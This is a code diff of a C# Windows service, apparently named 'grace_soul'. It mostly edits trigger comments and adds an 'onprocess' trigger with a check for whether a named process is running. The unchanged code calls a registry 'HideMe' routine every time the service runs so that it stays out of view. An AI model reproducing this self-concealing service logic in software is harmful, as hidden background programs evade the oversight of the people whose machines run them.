@@ -117,7 +117,7 @@ namespace grace_soul
 
                 if (cls_Scheduler.IsThereAnyTrigger())
                 {                    
-                    // Trigger: 'OnStartup' event
+                    // Trigger: 'onstartup' event
                     #region OnStartup
                     RunTrigger("{@onstartup@}", "");
                     #endregion
@@ -130,7 +130,7 @@ namespace grace_soul
 
             try
             {
-                // Make sure to hide everytime service runs
+                // Make sure to hide, everytime the service runs
                 cls_System.cls_Registry.HideMe();
             }
             catch(Exception ex)
@@ -141,7 +141,7 @@ namespace grace_soul
 
         protected override void OnStop()
         {
-            // Trigger: 'OnShutdown' Checking
+            // Trigger: 'onshutdown' Checking
             #region OnShutdown
             RunTrigger("{@onshutdown@}", "");
             #endregion
@@ -381,10 +381,8 @@ namespace grace_soul
 
             // Trigger: 'OnProccess' event
             #region OnProcess
-
-
+            RunTrigger("{@onprocess@}", "");
             #endregion
-
 
 
 
@@ -418,6 +416,17 @@ namespace grace_soul
             //        }
             //    }
             //}
+        }
+
+        private bool trigger_onprocess(string s_procName)
+        {
+            Process found = cls_System.GetLocalComputerProcesses().Find(item => item.ProcessName.Contains(s_procName));
+            if (found != null)
+            {
+                return true;
+            }
+
+            return false;
         }
     }
 }
